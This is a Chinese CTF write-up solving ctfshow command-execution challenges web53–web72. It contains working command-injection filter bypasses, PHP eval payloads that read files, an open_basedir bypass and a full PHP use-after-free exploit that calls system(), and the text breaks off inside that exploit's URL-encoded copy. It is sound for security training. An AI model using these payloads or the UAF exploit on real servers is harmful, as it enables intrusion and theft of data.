?c=nl${IFS}/f''lag||
?c=m''ore${IFS}/f''lag||
?c=l''ess${IFS}/f''lag||

# 查看源代码
?c=c\at${IFS}/fl\ag||
?c=t\ac${IFS}/fl\ag||
?c=n\l${IFS}/fl\ag||
?c=mor\e${IFS}/fl\ag||
?c=les\s${IFS}/fl\ag||

```

![image-20251218095233409](ctfshow-web(命令执行).assets/image-20251218095233409.png)

```
ctfshow{149c65f6-211b-4900-9f8c-ebaad088f9e9}
```



### web53

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 18:21:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

```
?c=ca''t${IFS}fla''g.php
```

这里的代码有点不一样，说一下这两种的区别

（1）直接执行 system($c);

```php
system($c);
```

这种方式会直接执行命令 $c 并将命令的输出直接发送到标准输出（通常是浏览器）；不会返回命令的输出值，因此不能对输出结果进行进一步处理

（2）使用一个参数来接受 system 的返回值后再输出它

```
$d = system($c);
echo "<br>".$d;
```

这种方式不仅会执行命令 $c，而且会将命令的最后一行输出结果赋值给变量 $d；然后通过 echo "<br>".$d; 将变量 $d 的内容输出到标准输出；如果命令产生了多行输出，只有最后一行会被存储在变量 $d 中并输出，而其他行会直接输出到标准输出。其中 "<br>" 是 HTML 标签，用于在网页中插入换行符

```
?c=ls
```

![image-20251222165047243](ctfshow-web(命令执行).assets/image-20251222165047243.png)

输出结果为：

```
lsflag.php index.php readflag
readflag
```

我们构造payload

```
?c=nl${IFS}fla\g.php

nl是读取文件加上行数
```

![image-20251222165616338](ctfshow-web(命令执行).assets/image-20251222165616338.png)



```
ctfshow{ecafe7e9-ff3d-470f-ae41-16482ae52390}
```





### web54

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 19:43:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

```
preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)
```

其他都差不多，主要是这里使用了很多星号来匹配，比如 .*c.*a.*t.* ，只要内容顺序符合 ...c...a...t...就会被检测，不管在这三个字母前后或者中间有什么，都会匹配成功。

nl 被过滤掉了，我们可以使用 **rev 反向输出**。

并且这里通配符问号没有被过滤，构造 payload：

```
?c=rev${IFS}fla?.php
```

![image-20251222170350057](ctfshow-web(命令执行).assets/image-20251222170350057.png)

```
ctfhsw{ead42ff2d453-46fd-9518-1ded883eb617}
```





### web55

#### bash无字母命令执行

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 20:03:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

```
且不能出现字母、分号、反引号、百分号、Tab、&、>、<。”
```

由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。

但因为字母不能传入，我们需要使用通配符?来进行代替

```
?c=/bin/base64 flag.php
```

但是由于字母被过滤了我们直接去用通配符

替换后变成

```
?c=/???/????64 ????.???

????.???表示flag.php
```

![image-20260107155553539](ctfshow-web(命令执行).assets/image-20260107155553539.png)

```
ctfshow{6e03d132-4e67-4e4f-9150-d816affffe3d}
```



方法二

**用八进制转义序列拼出小写字母，从而绕过正则对小写字母的过滤**

```
bash无字母命令执行

使用

$'\154\163'


故payload是

/?c=$'\143\141\164'%20*
```

| 八进制 | 对应 ASCII 字符 |
| :----- | :-------------- |
| \154   | l               |
| \163   | s               |
| \143   | c               |
| \141   | a               |
| \164   | t               |

![image-20260107160053194](ctfshow-web(命令执行).assets/image-20260107160053194.png)

```
?c=$'\143\141\164'%20*
```

![image-20260107160242055](ctfshow-web(命令执行).assets/image-20260107160242055.png)





### web56

**无字母 shell 命令执行**

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

现在好像不能用哪个八进制的方法绕过了

可以用python脚本写

1.由于传入的参数c，可以执行linux系统命令，.【点】没有被过滤，等效与source 执行脚本

2.且php文件上传后，会在tmp/php【随机数六位】生成对应的临时文件，随即删除

3.我们用python脚本，上传文件的同时，执行该文件，就可以得到对应命令

4.[@-[] 此处为何最后一位需要用[@-[]来表示，这需要查阅ascii码表，可以看出，大写字母是被@和[两个字符所包围的，因此[@-[]可以用来表示所有的大写字母，更好的匹配tmp目录下的文件 '''



**传上去一个 bash 脚本 → 让靶机用 source 去执行它**

exp

```python
import requests
from requests.packages import urllib3          # 1. 忽略警告
urllib3.disable_warnings()                     # 2. 关掉烦人的 InsecureRequestWarning

url = 'https://3309e5ed-29a1-4abc-81b1-8446516af31d.challenge.ctf.show/'
payload = '?c=.%20/???/????????[@-[]'

command = input("please input your command:")
file = {"file": f"#!/bin/bash\n{command}\n"}

# 核心：verify=False
r = requests.post(url=url+payload, files=file, verify=False).text
print(r)
```

可以得到

```

PS C:\Users\asus\Desktop\总文件\twzt\pythontest> python 3.py
please input your command:cat *
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-07 19:40:53
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 19:41:00
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


$flag="ctfshow{7692e31f-6bcf-445d-931e-213e077a9e7d}";<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

```
ctfshow{7692e31f-6bcf-445d-931e-213e077a9e7d}
```



### web57

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-08 01:02:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");//让我们去构建好数字
    }
}else{
    highlight_file(__FILE__);
}
```

```
先说两个东西，在 Linux 下：

$(())=0
$((~ $(()) ))=-1

通过$(())操作构造出36： $(()) ：代表做一次运算，因为里面为空，也表示值为0

$(( ~$(()) )) ：对0作取反运算，值为-1

$(( $((~$(()))) $((~$(()))) ))： -1-1，也就是(-1)+(-1)为-2，所以值为-2

$(( ~$(( $((~$(()))) $((~$(()))) )) )) ：再对-2做一次取反得到1，所以值为1

故我们在$(( ~$(( )) ))里面放37个$((~$(())))，得到-37，取反即可得到36:
```

```python
get_reverse_number = "$((~$(({}))))" # 取反操作
negative_one = "$((~$(())))"		# -1
payload = get_reverse_number.format(negative_one*37)
print(payload)
```

python生成

```
$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```

![image-20260107162943083](ctfshow-web(命令执行).assets/image-20260107162943083.png)

```
ctfshow{13be30c4-c18e-4415-add8-609abc19f131}
```



### web58

#### 命令执行，突破禁用函数

```
命令执行，突破禁用函数
```

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

![image-20260107163806836](ctfshow-web(命令执行).assets/image-20260107163806836.png)

调用 system 函数，发现函数被禁用

##### show_source 或者 highlight_file

这里使用 show_source 或者 highlight_file，构造 payload：

```
c=show_source('flag.php');

c=highlight_file('flag.php');
```

![image-20260107164026423](ctfshow-web(命令执行).assets/image-20260107164026423.png)

```
ctfshow{3cef454e-f28c-4359-8d0e-2081ed65ed1e}
```

也可以直接将 php 代码传给 eval 函数让其执行，构造 payload：

```
c=include("php://filter/convert.iconv.utf8.utf16/resource=flag.php");
```

还有其他方法

##### copy

```
c=copy("flag.php","flag.txt");
```

![image-20260107165005490](ctfshow-web(命令执行).assets/image-20260107165005490.png)

##### rename 函数

通过将 flag.php 重命名为 txt 文件，之后直接访问读取，和上面的 copy 差不多

```
c=rename("flag.php","flag.txt");
```



##### file_get_contents 函数

使用 file_get_contents 进行读取，再配合 echo 输出，payload：

```
c=echo file_get_contents("flag.php");
```

##### readfile 函数

```
c=readfile("flag.php");
```

##### file 函数

```
c=print_r(file("flag.php"));     
```



### web59

```
命令执行，突破禁用函数
```

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

依旧使用

```
c=show_source('flag.php');

c=highlight_file('flag.php');
```

![image-20260107164808333](ctfshow-web(命令执行).assets/image-20260107164808333.png)





### web60

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

还是这个

```
c=copy("flag.php","flag.txt");
```

![image-20260107165324073](ctfshow-web(命令执行).assets/image-20260107165324073.png)



```
ctfshow{c55559d4-a317-460c-bd1e-1145c39f74d7}
```





### web61

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);

```

```
c=show_source('flag.php');
```

![image-20260107170043218](ctfshow-web(命令执行).assets/image-20260107170043218.png)

```
ctfshow{1a8bc35f-beec-47a6-aca7-9a8fcec3a474}
```





### web62

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

```
c=show_source('flag.php');
```

![image-20260107170444269](ctfshow-web(命令执行).assets/image-20260107170444269.png)

```
ctfshow{c1431a81-de94-4314-a78c-35a3cb2855ea}
```



### web63

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

```
c=show_source('flag.php');
```

![image-20260107170755906](ctfshow-web(命令执行).assets/image-20260107170755906.png)

```
ctfshow{60d76f59-6c10-42b1-8a55-940cdac9159e}
```



### web64

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```



```
c=show_source('flag.php');
```

![image-20260107171348076](ctfshow-web(命令执行).assets/image-20260107171348076.png)

```
ctfshow{86eab349-5df6-4630-b99d-4150bce1099d}
```



### web65

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```



```
c=show_source('flag.php');
```

![image-20260107171635831](ctfshow-web(命令执行).assets/image-20260107171635831.png)

```
ctfshow{7f6d73b8-1b18-45af-a781-2ccff8cfec8a}
```



### web66

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

万能的c=show_source('flag.php');被禁了

用

```
c=highlight_file("flag.php");
```

![image-20260107172059459](ctfshow-web(命令执行).assets/image-20260107172059459.png)

先使用 scandir() 进行目录扫描：

```
c=print_r(scandir("./"));
```

![image-20260107172155504](ctfshow-web(命令执行).assets/image-20260107172155504.png)

当前目录下只有 index.php 和 flag.php 

扫一下根目录：

```
c=print_r(scandir("/"));
```

![image-20260107172255852](ctfshow-web(命令执行).assets/image-20260107172255852.png)

发现存在 flag.txt 

使用 highlight_file 读取：

```
c=highlight_file("/flag.txt");
```

![image-20260107172740484](ctfshow-web(命令执行).assets/image-20260107172740484.png)

```
ctfshow{3c68d097-f825-4325-aded-1bcaa3760d41}
```

其中 print_r 也可以使用 var_dump

```
c=var_dump(scandir("/"));
```



### web67

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

![image-20260107173911322](ctfshow-web(命令执行).assets/image-20260107173911322.png)

被禁用print_r(scandir("/"));

使用c=var_dump(scandir("/"));

```
c=var_dump(scandir("/"));
```

![image-20260107174241921](ctfshow-web(命令执行).assets/image-20260107174241921.png)

```
c=highlight_file("/flag.txt");
```

![image-20260107174456882](ctfshow-web(命令执行).assets/image-20260107174456882.png)

```
ctfshow{f84fd072-2ade-405f-b17d-86bb688e163e}
```



### web68

highlight_file() 被禁用了

扫描根目录：

```
c=var_dump(scandir('/'));
```

![image-20260107173258115](ctfshow-web(命令执行).assets/image-20260107173258115.png)

存在 flag.txt

但是 show_source() 和 highlight_file 都被禁用了

对于 txt 文件，我们使用 include 进行包含就可以直接看到文件内容：

```
c=include("/flag.txt");
```

![image-20260107173439134](ctfshow-web(命令执行).assets/image-20260107173439134.png)



```
ctfshow{5db0b376-ded1-4430-9eec-8ca3af09136f}
```



### web69

 highlight_file() 被禁用

![image-20260107175235033](ctfshow-web(命令执行).assets/image-20260107175235033.png)

```
c=var_dump(scandir('/'));
```

这个也被禁用

![image-20260107175339850](ctfshow-web(命令执行).assets/image-20260107175339850.png)

```
c=print_r(scandir('/'));
```

也被禁用

使用 var_export 函数打印变量：

```
c=var_export(scandir('/'));
```

存在 flag.txt 

![image-20260107180106400](ctfshow-web(命令执行).assets/image-20260107180106400.png)

用include

```
include("/flag.txt");
```

![image-20260107180613457](ctfshow-web(命令执行).assets/image-20260107180613457.png)

```
ctfshow{22f7d1af-8ab5-4ad9-a185-5f8959738395}
```



### web70

![image-20260107191915958](ctfshow-web(命令执行).assets/image-20260107191915958.png)

我们发现

error_reporting() 

ini_set()

highlight_file()

这些不能用

使用 var_export 函数打印变量：

```
c=var_export(scandir('/'));
```

![image-20260107194045553](ctfshow-web(命令执行).assets/image-20260107194045553.png)

直接用include

```
c=include("/flag.txt");
```

![image-20260107194158101](ctfshow-web(命令执行).assets/image-20260107194158101.png)



```
ctfshow{79608ee8-b85c-4c92-8663-5ccca3264281}
```



### web71

![image-20260107194420866](ctfshow-web(命令执行).assets/image-20260107194420866.png)

使用var_export(scandir('/'));
发现全是？号

![image-20260107194540884](ctfshow-web(命令执行).assets/image-20260107194540884.png)

我们下载附件看看

```php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
```

 ob_get_contents()是将缓冲区的内容输出，然后ob_end_clean()清空缓冲区，最后将缓冲区内容(flag)中的字符全部替换成？，最后输出；



既然eval函数后面的代码会影响我们的输出，那我们可以直接不执行后面的代码；

```
有两个函数可以停止后面代码的执行

die();  //c=include("/flag.txt");die();
exit(); //c=include("/flag.txt");exit();
```

![image-20260107194947067](ctfshow-web(命令执行).assets/image-20260107194947067.png)

```
ctfshow{2b7a2b45-c68b-4a3a-8e9c-9896dd53c56c}
```



### web72

![image-20260107195142913](ctfshow-web(命令执行).assets/image-20260107195142913.png)

```php
<?php

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？

```

我们使用扫描一下

```
c=var_export(scandir('./'));exit();
```

![image-20260107200824647](ctfshow-web(命令执行).assets/image-20260107200824647.png)

但是不能查看根目录的

![image-20260107201019153](ctfshow-web(命令执行).assets/image-20260107201019153.png)

open_basedir restriction in effect. File(/) i

限制了读取权限

我们要去绕过这个限制

使用 glob:// 伪协议绕过 open_basedir，读取根目录下的文件，payload：

```php
c=$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{
   echo($f->__toString().' ');
}
exit(0);
```

解释脚本

```
$a = new DirectoryIterator("glob:///*"); // 创建一个DirectoryIterator对象，遍历根目录
foreach ($a as $f) { // 遍历每个条目
    echo($f->__toString() . ' '); // 输出条目的名称，并添加一个空格
}
exit(0); // 终止脚本执行
```

![image-20260107202219830](ctfshow-web(命令执行).assets/image-20260107202219830.png)

我们发现有一个flag0.txt

利用uaf的脚本进行命令利用uaf的脚本进行命令执行执行：

尝试执行ls /; cat /flag0.txt命令

```php
c=?><?php
pwn("ls /;cat /flag0.txt");
 
function pwn($cmd) {
    global $abc, $helper, $backtrace;
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }
 
    class Helper {
        public $a, $b, $c, $d;
    }
 
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
 
    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf('%c',$ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }
 
    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf('%c',$v & 0xff);
            $v >>= 8;
        }
    }
 
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }
 
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
 
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
 
        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
 
            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }
 
        if(!$data_addr || !$text_size || !$data_size)
            return false;
 
        return [$data_addr, $text_size, $data_size];
    }
 
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
 
            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
 
            return $data_addr + $i * 8;
        }
    }
 
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }
 
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
 
            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
 
    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }
 
    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }
 
    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
 
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];
 
    $helper = new Helper;
    $helper->b = function ($x) { };
 
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }
 
    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
 
    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
 
    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);
 
    $closure_obj = str2ptr($abc, 0x20);
 
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }
 
    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }
 
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }
 
    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }
 
    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
 
    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
 
    ($helper->b)($cmd);
    exit();
}
```

尝试执行ls /; cat /flag0.txt命令

URL 编码后传入，payload：

```
c=%3f%3e%3c%3fphp%0apwn(%22ls+%2f%3bcat+%2fflag0.txt%22)%3b%0a%0afunction+pwn(%24cmd)+%7b%0a++++global+%24abc%2c+%24helper%2c+%24backtrace%3b%0a++++class+Vuln+%7b%0a++++++++public+%24a%3b%0a++++++++public+function+__destruct()+%7b+%0a++++++++++++global+%24backtrace%3b+%0a++++++++++++unset(%24this-%3ea)%3b%0a++++++++++++%24backtrace+%3d+(new+Exception)-%3egetTrace()%3b+%23+%3b)%0a++++++++++++if(!isset(%24backtrace%5b1%5d%5b%27args%27%5d))+%7b+%23+PHP+%3e%3d+7.4%0a++++++++++++++++%24backtrace+%3d+debug_backtrace()%3b%0a++++++++++++%7d%0a++++++++%7d%0a++++%7d%0a%0a++++class+Helper+%7b%0a++++++++public+%24a%2c+%24b%2c+%24c%2c+%24d%3b%0a++++%7d%0a%0a++++function+str2ptr(%26%24str%2c+%24p+%3d+0%2c+%24s+%3d+8)+%7b%0a++++++++%24address+%3d+0%3b%0a++++++++for(%24j+%3d+%24s-1%3b+%24j+%3e%3d+0%3b+%24j--)+%7b%0a++++++++++++%24address+%3c%3c%3d+8%3b%0a++++++++++++%24address+%7c%3d+ord(%24str%5b%24p%2b%24j%5d)%3b%0a++++++++%7d%0a++++++++return+%24address%3b%0a++++%7d%0a%0a++++function+ptr2str(%24ptr%2c+%24m+%3d+8)+%7b%0a++++++++%24out+%3d+%22%22%3b%0a++++++++for+(%24i%3d0%3b+%24i+%3c+%24m%3b+%24i%2b%2b)+%7b%0a++++++++++++%24out+.%3d+sprintf(%27%25c%27%2c%24ptr+%26+0xff)%3b%0a++++++++++++%24ptr+%3e%3e%3d+8%3b%0a++++++++%7d%0a++++++++return+%24out%3b%0a++++%7d%0a%0a++++function+write(%26%24str%2c+%24p%2c+%24v%2c+%24n+%3d+8)+%7b%0a++++++++%24i+%3d+0%3b%0a++++++++for(%24i+%3d+0%3b+%24i+%3c+%24n%3b+%24i%2b%2b)+%7b%0a++++++++++++%24str%5b%24p+%2b+%24i%5d+%3d+sprintf(%27%25c%27%2c%24v+%26+0xff)%3b%0a++++++++++++%24v+%3e%3e%3d+8%3b%0a++++++++%7d%0a++++%7d%0a%0a++++function+leak(%24addr%2c+%24p+%3d+0%2c+%24s+%3d+8)+%7b%0a++++++++global+%24abc%2c+%24helper%3b%0a++++++++write(%24abc%2c+0x68%2c+%24addr+%2b+%24p+-+0x10)%3b%0a++++++++%24leak+%3d+strlen(%24helper-%3ea)%3b%0a++++++++if(%24s+!%3d+8)+%7b+%24leak+%25%3d+2+%3c%3c+(